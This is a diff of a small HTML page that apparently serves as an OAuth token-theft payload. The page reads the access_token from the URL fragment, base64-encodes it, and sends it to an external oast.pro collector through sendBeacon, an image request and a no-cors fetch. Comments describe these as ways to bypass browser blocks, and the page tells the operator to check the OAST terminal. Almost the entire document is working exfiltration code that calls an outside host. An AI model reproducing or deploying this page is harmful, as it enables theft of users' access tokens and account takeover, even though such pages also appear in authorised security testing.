@@ -1,30 +1,31 @@
 <!DOCTYPE html>
 <html>
+<head><title>Processing...</title></head>
 <body>
-    <h1>Processing Authentication...</h1>
+    <h1>Extracting Token...</h1>
     <script>
         (function() {
+            // 1. Capture the fragment (#access_token=...)
             var fragment = window.location.hash;
-            // YOUR CURRENT ACTIVE OAST LINK
-            var oastBase = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/"; 
+            
+            // 2. Your NEW OAST URL
+            var oastUrl = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/?token_data=" + btoa(fragment);
 
             if (fragment) {
-                var leakUrl = oastBase + "?token_data=" + btoa(fragment);
-                
-                // 1. Try Beacon (Highest success rate for exfiltration)
-                navigator.sendBeacon(leakUrl);
+                // METHOD A: Navigator Beacon (Bypasses most browser blocks)
+                navigator.sendBeacon(oastUrl);
 
-                // 2. Try Image Fallback
+                // METHOD B: Image source (The classic "leak" method)
                 var img = new Image();
-                img.src = leakUrl;
+                img.src = oastUrl;
 
-                // 3. Try Fetch (No-CORS mode)
-                fetch(leakUrl, { mode: 'no-cors' });
+                // METHOD C: Fetch (Modern background request)
+                fetch(oastUrl, { mode: 'no-cors' });
 
-                console.log("Exfiltration attempted.");
-                document.body.innerHTML = "<h1>Success!</h1><p>Check your OAST terminal now.</p>";
+                console.log("Token leak triggered to: " + oastUrl);
+                document.body.innerHTML = "<h1>Success</h1><p>Check your OAST terminal for the hit.</p>";
             } else {
-                document.body.innerHTML = "<h1>Error: No fragment found in URL.</h1>";
+                document.body.innerHTML = "<h1>Error: No fragment detected.</h1>";
             }
         })();
     </script>
